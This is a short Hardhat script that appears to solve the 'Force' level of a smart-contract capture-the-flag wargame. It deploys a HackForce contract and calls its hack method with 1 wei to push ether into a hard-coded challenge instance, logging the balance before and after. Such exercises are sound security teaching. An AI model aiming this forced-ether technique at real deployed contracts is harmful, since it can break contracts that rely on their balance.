const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const HackForce = await ethers.getContractFactory("HackForce");

    // Deploy the HackForce contract
    console.log('Deploying the HackForce contract');
    contract = await HackForce.deploy();
    await contract.deployed();
    
    console.log(`Force instance balance: ${await ethers.provider.getBalance(instance_address)}`);

    // Call the hack method
    console.log('Hacking...');
    let tx = await contract.hack(instance_address, {value: 1});

    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`Force instance balance: ${await ethers.provider.getBalance(instance_address)}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x5e4b54B5f8543bBd761E88021C42ae9449a748Dc';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
